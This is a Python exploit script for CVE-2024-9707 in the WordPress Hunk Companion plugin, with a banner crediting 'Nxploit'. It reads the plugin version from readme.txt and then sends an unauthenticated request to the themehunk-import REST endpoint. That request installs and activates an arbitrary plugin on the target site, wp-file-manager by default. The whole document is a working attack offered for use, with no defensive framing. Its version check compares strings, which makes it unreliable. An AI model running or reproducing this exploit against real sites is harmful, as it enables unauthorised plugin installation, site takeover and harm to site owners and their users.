import requests
import argparse
import json

DEFAULT_PLUGIN = "wp-file-manager"
DEFAULT_PLUGIN_PATH = "wp-file-manager/wp-file-manager.php"

def display_banner():
    banner = """\
 @@@@@@@  @@@  @@@  @@@@@@@@              @@@@@@    @@@@@@@@    @@@@@@        @@@               @@@@@@   @@@@@@@@   @@@@@@@@   @@@@@@@@  
@@@@@@@@  @@@  @@@  @@@@@@@@             @@@@@@@@  @@@@@@@@@@  @@@@@@@@      @@@@              @@@@@@@@  @@@@@@@@  @@@@@@@@@@  @@@@@@@@  
!@@       @@!  @@@  @@!                       @@@  @@!   @@@@       @@@     @@!@!              @@!  @@@       @@!  @@!   @@@@       @@!  
!@!       !@!  @!@  !@!                      @!@   !@!  @!@!@      @!@     !@!!@!              !@!  @!@      !@!   !@!  @!@!@      !@!   
!@!       @!@  !@!  @!!!:!    @!@!@!@!@     !!@    @!@ @! !@!     !!@     @!! @!!   @!@!@!@!@  !!@!!@!!     @!!    @!@ @! !@!     @!!    
!!!       !@!  !!!  !!!!!:    !!!@!@!!!    !!:     !@!!!  !!!    !!:     !!!  !@!   !!!@!@!!!    !!@!!!    !!!     !@!!!  !!!    !!!     
:!!       :!:  !!:  !!:                   !:!      !!:!   !!!   !:!      :!!:!:!!:                  !!!   !!:      !!:!   !!!   !!:      
:!:        ::!!:!   :!:                  :!:       :!:    !:!  :!:       !:::!!:::                  !:!  :!:       :!:    !:!  :!:       
 ::: :::    ::::     :: ::::             :: :::::  ::::::: ::  :: :::::       :::              ::::: ::   ::       ::::::: ::   ::       
 :: :: :     :      : :: ::              :: : :::   : : :  :   :: : :::       :::               : :  :   : :        : : :  :   : :     
                                                    By | Nxploit | Khaled_alenazi 
    """
    print(banner)

def check_version(base_url):
    url_version = f"{base_url}/wp-content/plugins/hunk-companion/readme.txt"
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url_version, verify=False)
        response.raise_for_status()

        for line in response.text.splitlines():
            if line.startswith("Stable tag:"):
                version = line.split(":")[-1].strip()
                return version
        return None
    except requests.exceptions.RequestException as e:
        print(f"Error accessing version file: {e}")
        return None

def is_vulnerable(version):
    if version and version <= "1.8.4":
        return True
    return False

def install_plugin(base_url, plugin_name, plugin_path):
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/json"
    }

    data = {
        "params": {
            "templateType": "free",
            "plugin": {plugin_name: plugin_name.replace("-", " ").title()},
            "allPlugins": [{plugin_name: plugin_path}],
            "builder": "gogo",
            "themeSlug": "gogo",
            "proThemePlugin": plugin_name,
            "tmplFreePro": "plugin",
            "wpUrl": "https://downloads.wordpress.org/",
            "thUrl": "https://themehunk.com/wp/data/"
        }
    }

    url = f"{base_url}/wp-json/hc/v1/themehunk-import"
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.post(url, headers=headers, data=json.dumps(data), verify=False)
        response.raise_for_status()
        print("Plugin installed and activated successfully.")
        print("Response Status:", response.status_code)
        print("Response Body:", response.json())
    except requests.exceptions.RequestException as e:
        print("Error during plugin installation:", e)
    except json.JSONDecodeError:
        print("Error: Invalid JSON response.")

def main():
    display_banner()

    parser = argparse.ArgumentParser(description="WordPress Plugin Exploitation Script")
    parser.add_argument("-u", "--url", required=True, help="Base URL of the WordPress site.")
    parser.add_argument("-p", "--plugin", default=DEFAULT_PLUGIN, help="Plugin name (default: wp-file-manager).")

    args = parser.parse_args()

    plugin_path = f"{args.plugin}/{args.plugin}.php"

    version = check_version(args.url)
    if version:
        print(f"Detected version: {version}")
        if is_vulnerable(version):
            print("The site is vulnerable. Proceeding with exploitation.")
            install_plugin(args.url, args.plugin, plugin_path)
        else:
            print("The site is not vulnerable to CVE-2024-9707.")
    else:
        print("Could not determine the version. Exploitation aborted.")

if __name__ == "__main__":
    main()
